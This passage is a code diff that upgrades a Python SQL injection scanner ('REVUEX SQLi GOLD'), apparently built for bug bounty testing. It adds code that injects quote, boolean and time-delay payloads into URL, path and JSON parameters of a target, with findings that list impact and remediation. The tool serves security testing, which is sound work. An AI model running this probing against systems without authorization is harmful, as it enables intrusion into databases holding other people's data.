+                if isinstance(value, (str, int, float)):
+                    points.append(InjectionPoint(
+                        location="json",
+                        key=key,  # Use simple key for mutation
+                        value=value,
+                        method="POST"
+                    ))
+                else:
+                    self._map_json_keys(value, points, full_key)
+        
+        elif isinstance(obj, list):
+            for i, item in enumerate(obj):
+                self._map_json_keys(item, points, f"{prefix}[{i}]")
+    
+    # =========================================================================
+    # REQUEST MUTATION ENGINE
+    # =========================================================================
+    
+    def _make_mutated_request(
+        self,
+        point: InjectionPoint,
+        payload: str
+    ) -> Tuple[Optional[Any], float]:
+        """
+        Make a request with mutated payload.
+        
+        Args:
+            point: Injection point
+            payload: SQL payload to inject
+        
+        Returns:
+            Tuple of (response, elapsed_time)
+        """
         self.rate_limiter.acquire()
         self.request_count += 1
         
+        # Generate second-order marker
+        marker = f"REVUEX_{hashlib.md5(payload.encode()).hexdigest()[:6]}"
+        full_payload = f"{payload}/*{marker}*/"
+        
+        # Prepare headers
+        headers = dict(self.session.headers)
+        headers["Content-Type"] = point.content_type
+        
+        # Parse target URL
+        parsed = urlparse(self.target)
+        params = parse_qs(parsed.query, keep_blank_values=True)
+        data = None
+        
+        # Mutate based on injection location
+        if point.location == "url":
+            # URL parameter injection
+            params[point.key] = [f"{point.value}{full_payload}"]
+        
+        elif point.location == "path":
+            # Surgical path injection with encoding
+            parts = parsed.path.split("/")
+            if isinstance(point.key, int) and point.key < len(parts):
+                original = parts[point.key]
+                parts[point.key] = f"{quote(str(original))}{quote(full_payload)}"
+                parsed = parsed._replace(path="/".join(parts))
+        
+        elif point.location == "json":
+            # Deep JSON mutation
+            mutated_body = MutationEngine.mutate_json_recursive(
+                copy.deepcopy(self.json_body),
+                point.key,
+                full_payload
+            )
+            data = json.dumps(mutated_body)
+        
+        # Build final URL
+        url = parsed._replace(query=urlencode(params, doseq=True)).geturl()
+        
         try:
-            if method.upper() == "GET":
-                response = self.session.get(url, timeout=self.timeout, allow_redirects=True)
-            else:
-                response = self.session.post(url, data=data, timeout=self.timeout, allow_redirects=True)
+            start_time = time.time()
+            response = self.session.request(
+                method=point.method,
+                url=url,
+                headers=headers,
+                data=data,
+                timeout=self.timeout + self.time_delay + 2,
+                allow_redirects=True
+            )
+            elapsed = time.time() - start_time
+            
+            # Track second-order marker
+            self.second_order_markers.append(marker)
             
             time.sleep(self.delay)
-            return response
+            return response, elapsed
+            
         except Exception as e:
             self.logger.debug(f"Request failed: {e}")
-            return None
+            return None, 0
+    
+    # =========================================================================
+    # DETECTION TECHNIQUES
+    # =========================================================================
+    
+    def _test_error_inverse(self, point: InjectionPoint) -> None:
+        """
+        Error Inverse Verification technique.
+        
+        Tests: ' causes error, '' does not (proves SQL context)
+        """
+        # Test single quote - should cause error
+        resp1, _ = self._make_mutated_request(point, "'")
+        if resp1 is None:
+            return
+        
+        error1 = self._detect_sql_error(resp1.text)
+        if not error1:
+            return
+        
+        # Test double quote - should NOT cause error (escaped)
+        resp2, _ = self._make_mutated_request(point, "''")
+        if resp2 is None:
+            return
+        
+        error2 = self._detect_sql_error(resp2.text)
+        
+        # Confirmed: single quote errors, double quote doesn't
+        if error1 and not error2:
+            self.vulnerable_params.add(point.identifier)
+            self.detected_dbms = error1
+            
+            finding = Finding(
+                id=self._generate_finding_id(f"sqli_error_inverse_{point.key}"),
+                title=f"Confirmed Error-Based SQLi ({error1.upper()})",
+                severity=Severity.CRITICAL,
+                description=(
+                    f"Error-inverse verification confirmed SQL injection in '{point.key}'. "
+                    f"Single quote (') triggers SQL error, while escaped quote ('') does not, "
+                    f"proving the input is interpreted as SQL syntax."
+                ),
+                url=self.target,
+                parameter=str(point.key),
+                method=point.method,
+                payload="' (error) vs '' (no error)",
+                evidence=f"DBMS: {error1}, Location: {point.location}",
+                impact=(
+                    "CRITICAL: Confirmed SQL injection allows complete database compromise:\n"
+                    "- Full data extraction (credentials, PII, secrets)\n"
+                    "- Authentication bypass\n"
+                    "- Data modification/deletion\n"
+                    "- Potential RCE via xp_cmdshell/INTO OUTFILE"
+                ),
+                remediation=(
+                    "1. Use parameterized queries (prepared statements) - MANDATORY\n"
+                    "2. Use stored procedures with parameterized inputs\n"
+                    "3. Implement strict input validation (allowlist)\n"
+                    "4. Apply least privilege to database accounts\n"
+                    "5. Deploy WAF as defense-in-depth (not primary fix)"
+                ),
+                vulnerability_type="sqli",
+                confidence="high",
+            )
+            self.add_finding(finding)
+            
+            self._print_poc(point, "'", resp1)
+    
+    def _test_boolean_hardened(self, point: InjectionPoint) -> None:
+        """
+        Hardened Boolean-Based detection with triple verification.
+        
+        Verifies: TRUE response == baseline, FALSE response != baseline, TRUE != FALSE
+        """
+        if point.identifier in self.vulnerable_params:
+            return
+        
+        # Select payloads based on value type
+        if isinstance(point.value, (int, float)) or str(point.value).isdigit():
+            payloads = BOOLEAN_PAYLOADS_NUMERIC
+        else:
+            payloads = BOOLEAN_PAYLOADS_STRING
+        
+        for true_payload, false_payload in payloads:
+            # Test TRUE condition
+            resp_true, _ = self._make_mutated_request(point, true_payload)
+            if resp_true is None:
+                continue
+            
+            # Test FALSE condition
+            resp_false, _ = self._make_mutated_request(point, false_payload)
+            if resp_false is None:
+                continue
+            
+            # Triple verification:
+            # 1. TRUE response similar to baseline
+            true_is_baseline = self._is_similar_to_baseline(resp_true)
+            
+            # 2. FALSE response different from baseline
+            false_is_different = not self._is_similar_to_baseline(resp_false)
+            
+            # 3. TRUE and FALSE responses differ from each other
+            responses_differ = self._responses_differ(resp_true, resp_false)
+            
+            if true_is_baseline and false_is_different and responses_differ:
+                self.vulnerable_params.add(point.identifier)
+                
+                finding = Finding(
+                    id=self._generate_finding_id(f"sqli_boolean_{point.key}"),
+                    title="Hardened Boolean-Based Blind SQLi",
+                    severity=Severity.HIGH,
+                    description=(
+                        f"Triple-verified Boolean-based SQL injection in '{point.key}'. "
+                        f"TRUE condition matches baseline, FALSE differs, confirming "
+                        f"SQL logic interpretation."
+                    ),
+                    url=self.target,
+                    parameter=str(point.key),
+                    method=point.method,
+                    payload=f"TRUE: {true_payload} | FALSE: {false_payload}",
+                    evidence=(
+                        f"TRUE len: {len(resp_true.text)}, "
+                        f"FALSE len: {len(resp_false.text)}, "
+                        f"Baseline len: {self.baseline_stats.get('len', 0)}"
+                    ),
+                    impact=(
+                        "Boolean-based blind SQLi enables bit-by-bit data extraction:\n"
+                        "- Extract usernames, passwords, secrets\n"
+                        "- Map database structure\n"
+                        "- Slower but equally dangerous as error-based"
+                    ),
+                    remediation=(
+                        "1. Use parameterized queries (prepared statements)\n"
+                        "2. Implement strict input validation\n"
+                        "3. Use ORM frameworks with proper escaping\n"
+                        "4. Apply principle of least privilege"
+                    ),
+                    vulnerability_type="sqli",
+                    confidence="high",
+                )
+                self.add_finding(finding)
+                
+                self._print_poc(point, true_payload, resp_true)
+                break
+    
+    def _test_time_statistical(self, point: InjectionPoint) -> None:
+        """
+        Statistical Time-Based detection.
+        
+        Takes multiple samples and uses median to eliminate network jitter.
+        """
+        if point.identifier in self.vulnerable_params:
+            return
+        
+        baseline_time = self.baseline_stats.get("time", 1.0)
+        threshold = baseline_time + self.time_delay - 0.7  # 0.7s tolerance
+        
+        for payload_template in TIME_PAYLOADS:
+            payload = payload_template.format(delay=self.time_delay)
+            times = []
+            
+            # Collect multiple samples
+            for _ in range(self.statistical_samples):
+                _, elapsed = self._make_mutated_request(point, payload)
+                times.append(elapsed)
+            
+            # Remove outliers (first and last after sorting)
+            times.sort()
+            if len(times) >= 3:
+                trimmed = times[1:-1]  # Remove min and max
+            else:
+                trimmed = times
+            
+            median_time = statistics.median(trimmed)
+            
+            # Check if median exceeds threshold
+            if median_time >= threshold:
+                self.vulnerable_params.add(point.identifier)
+                
+                finding = Finding(
+                    id=self._generate_finding_id(f"sqli_time_{point.key}"),
+                    title="Statistical Time-Based Blind SQLi",
+                    severity=Severity.HIGH,
+                    description=(
+                        f"Time-based SQL injection confirmed in '{point.key}' using "
+                        f"statistical analysis ({self.statistical_samples} samples). "
+                        f"Median response time: {median_time:.2f}s (expected delay: {self.time_delay}s)."
+                    ),
+                    url=self.target,
+                    parameter=str(point.key),
+                    method=point.method,
+                    payload=payload,
+                    evidence=(
+                        f"Median: {median_time:.2f}s, "
+                        f"Baseline: {baseline_time:.2f}s, "
+                        f"Threshold: {threshold:.2f}s, "
+                        f"Samples: {times}"
+                    ),
+                    impact=(
+                        "Time-based blind SQLi allows data extraction via timing:\n"
+                        "- Works even when no output is visible\n"
+                        "- Can bypass many security controls\n"
+                        "- Slower but reliable extraction"
+                    ),
+                    remediation=(
+                        "1. Use parameterized queries (prepared statements)\n"
+                        "2. Implement query timeouts\n"
+                        "3. Monitor slow query logs\n"
+                        "4. Rate limit suspicious patterns"
+                    ),
+                    vulnerability_type="sqli",
+                    confidence="high",
+                )
+                self.add_finding(finding)
+                
+                self._print_poc(point, payload, None)
+                break
+    
+    # =========================================================================
+    # BASELINE & HELPERS
+    # =========================================================================
+    
+    def _capture_baseline(self) -> None:
+        """Capture baseline response with statistical timing analysis."""
+        latencies = []
+        response = None
+        
+        for _ in range(3):
+            try:
+                start = time.time()
+                response = self.session.get(self.target, timeout=self.timeout)
+                latencies.append(time.time() - start)
+            except Exception:
+                latencies.append(self.timeout)
+        
+        self.baseline_stats = {
+            "len": len(response.text) if response else 0,
+            "time": statistics.median(latencies),
+            "text": response.text[:3000] if response else "",
+            "status": response.status_code if response else 0,
+            "hash": hashlib.md5(response.text.encode()).hexdigest() if response else "",
+        }
+        
+        self.logger.debug(f"Baseline: len={self.baseline_stats['len']}, time={self.baseline_stats['time']:.2f}s")
+    
+    def _detect_sql_error(self, text: str) -> Optional[str]:
+        """Detect SQL error and return DBMS type."""
+        for dbms, patterns in SQL_ERRORS.items():
+            for pattern in patterns:
+                if re.search(pattern, text, re.IGNORECASE):
+                    return dbms
+        return None
+    
+    def _is_similar_to_baseline(self, response) -> bool:
+        """Check if response is similar to baseline."""
+        if not self.baseline_stats:
+            return True
+        
+        baseline_len = self.baseline_stats.get("len", 0)
+        response_len = len(response.text)
+        
+        # Length difference check
+        if abs(response_len - baseline_len) > 100:
+            return False
+        
+        # Hash check
+        response_hash = hashlib.md5(response.text.encode()).hexdigest()
+        if response_hash == self.baseline_stats.get("hash"):
+            return True
+        
+        # Content similarity check
+        ratio = difflib.SequenceMatcher(
+            None,
+            response.text[:1000],
+            self.baseline_stats.get("text", "")[:1000]
+        ).ratio()
+        
+        return ratio > 0.8
+    
+    def _responses_differ(self, resp1, resp2) -> bool:
+        """Check if two responses differ significantly."""
+        # Length difference
+        if abs(len(resp1.text) - len(resp2.text)) > 50:
+            return True
+        
+        # Status code difference
+        if resp1.status_code != resp2.status_code:
+            return True
+        
+        # Content similarity
+        ratio = difflib.SequenceMatcher(
+            None,
+            resp1.text[:1000],
+            resp2.text[:1000]
+        ).ratio()
+        
+        return ratio < 0.9
     
     def _generate_finding_id(self, context: str) -> str:
-        """Generate unique finding ID"""
+        """Generate unique finding ID."""
         data = f"{self.target}:{context}:{datetime.now().isoformat()}"
         return hashlib.md5(data.encode()).hexdigest()[:12]
+    
+    def _print_poc(self, point: InjectionPoint, payload: str, response) -> None:
+        """Print Burp Repeater ready PoC."""
+        parsed = urlparse(self.target)
+        
+        print_success(f"SQLi Found: {point.key} [{point.method}]")
+        print(f"\n{'='*50}")
+        print("BURP REPEATER POC")
+        print(f"{'='*50}")
+        print(f"{point.method} {parsed.path or '/'} HTTP/1.1")
+        print(f"Host: {parsed.netloc}")
+        print(f"Content-Type: {point.content_type}")
+        print(f"\nInjection Point: {point.location}:{point.key}")
+        print(f"Payload: {payload}")
+        if response:
+            print(f"Response Length: {len(response.text)}")
+        print(f"{'='*50}\n")
 
 
 # =============================================================================
@@ -802,29 +834,29 @@ class SQLiScanner(BaseScanner):
 # =============================================================================
 
 def create_parser() -> argparse.ArgumentParser:
-    """Create CLI argument parser"""
+    """Create CLI argument parser."""
     parser = argparse.ArgumentParser(
         prog="revuex-sqli",
-        description="REVUEX SQLi Scanner - SQL Injection Detection",
+        description="REVUEX SQLi GOLD Scanner - Advanced SQL Injection Detection",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
-    %(prog)s -t "https://example.com/search?q=test"
-    %(prog)s -t "https://example.com/user?id=1" --level 2
-    %(prog)s -t "https://example.com/api?item=123" --dbms mysql -v
+    %(prog)s -t "https://example.com/api/user?id=1"
+    %(prog)s -t "https://example.com/api" --json '{"user":"test","id":1}'
+    %(prog)s -t "https://example.com/search?q=test" --level 3 -v
 
 Author: REVUEX Team
 License: MIT
         """
     )
     
-    parser.add_argument("-t", "--target", required=True, help="Target URL with parameters")
-    parser.add_argument("--level", type=int, choices=[1, 2, 3], default=1, help="Scan intensity")
-    parser.add_argument("--dbms", choices=["mysql", "postgresql", "mssql", "oracle", "sqlite"], help="Target DBMS")
-    parser.add_argument("--time-delay", type=int, default=5, help="Time-based delay (default: 5)")
-    parser.add_argument("--all-params", action="store_true", help="Test all parameters")
-    parser.add_argument("--no-waf-bypass", action="store_true", help="Skip WAF bypass testing")
-    parser.add_argument("-p", "--payloads", nargs="+", help="Custom payloads")
+    parser.add_argument("-t", "--target", required=True, help="Target URL")
+    parser.add_argument("--json", type=json.loads, default={}, help="JSON body for POST requests")
+    parser.add_argument("--level", type=int, choices=[1, 2, 3], default=3, help="Scan intensity (default: 3)")
+    parser.add_argument("--time-delay", type=int, default=5, help="Time-based delay seconds (default: 5)")
+    parser.add_argument("--samples", type=int, default=5, help="Statistical samples (default: 5)")
+    parser.add_argument("--no-methods", action="store_true", help="Don't test multiple HTTP methods")
+    parser.add_argument("--no-content-types", action="store_true", help="Don't test content-type confusion")
     parser.add_argument("-o", "--output", help="Output file (JSON)")
     parser.add_argument("--delay", type=float, default=0.5, help="Request delay (default: 0.5)")
     parser.add_argument("--timeout", type=int, default=10, help="Request timeout (default: 10)")
@@ -837,26 +869,26 @@ License: MIT
 
 
 def main() -> int:
-    """Main entry point"""
+    """Main entry point."""
     parser = create_parser()
     args = parser.parse_args()
     
     if not args.quiet:
         print(f"""
 ╔═══════════════════════════════════════════════════════════╗
-║  REVUEX SQLi Scanner v{SCANNER_VERSION}                             ║
-║  SQL Injection Vulnerability Detection                    ║
+║  REVUEX SQLi Scanner v{SCANNER_VERSION}-GOLD                        ║
+║  Private Research Grade - Bug Bounty Professional        ║
 ╚═══════════════════════════════════════════════════════════╝
         """)
     
     scanner = SQLiScanner(
         target=args.target,
+        json_body=args.json,
         time_delay=args.time_delay,
-        test_all_params=args.all_params,
-        test_waf_bypass=not args.no_waf_bypass,
-        dbms=args.dbms,
         level=args.level,
-        custom_payloads=args.payloads or [],
+        test_methods=not args.no_methods,
+        test_content_types=not args.no_content_types,
+        statistical_samples=args.samples,
         delay=args.delay,
         timeout=args.timeout,
         proxy=args.proxy,
@@ -870,7 +902,7 @@ def main() -> int:
     
     if not args.quiet:
         print(f"\n{'='*60}")
-        print(f"Scan Complete")
+        print("SCAN COMPLETE")
         print(f"{'='*60}")
         print(f"Target: {args.target}")
         print(f"Duration: {result.duration_seconds:.2f}s")
@@ -878,39 +910,43 @@ def main() -> int:
         print(f"Findings: {len(result.findings)}")
         
         if scanner.detected_dbms:
-            print(f"Detected DBMS: {scanner.detected_dbms.value.upper()}")
+            print(f"Detected DBMS: {scanner.detected_dbms.upper()}")
+        
+        if scanner.second_order_markers:
+            print(f"Second-Order Markers: {len(scanner.second_order_markers)}")
         
         if result.findings:
             print(f"\n{'='*60}")
-            print("Findings:")
+            print("FINDINGS SUMMARY")
             print(f"{'='*60}")
             for finding in result.findings:
-                severity_color = {
+                sev_colors = {
                     Severity.CRITICAL: "\033[95m",
                     Severity.HIGH: "\033[91m",
                     Severity.MEDIUM: "\033[93m",
-                    Severity.LOW: "\033[94m",
-                    Severity.INFO: "\033[96m",
-                }.get(finding.severity, "")
+                }
+                color = sev_colors.get(finding.severity, "")
                 reset = "\033[0m"
-                
-                print(f"\n{severity_color}[{finding.severity.value.upper()}]{reset} {finding.title}")
+                print(f"\n{color}[{finding.severity.value.upper()}]{reset} {finding.title}")
                 print(f"  Parameter: {finding.parameter}")
-                print(f"  Payload: {finding.payload}")
+                print(f"  Method: {finding.method}")
     
     if args.output:
-        import json
         output_data = {
+            "scanner": "REVUEX SQLi GOLD",
+            "version": SCANNER_VERSION,
             "target": args.target,
             "scan_id": result.scan_id,
             "duration": result.duration_seconds,
-            "detected_dbms": scanner.detected_dbms.value if scanner.detected_dbms else None,
+            "detected_dbms": scanner.detected_dbms,
+            "second_order_markers": scanner.second_order_markers[:10],
             "findings": [
                 {
                     "id": f.id,
                     "title": f.title,
                     "severity": f.severity.value,
                     "parameter": f.parameter,
+                    "method": getattr(f, "method", "GET"),
                     "payload": f.payload,
                     "evidence": f.evidence,
                     "remediation": f.remediation,
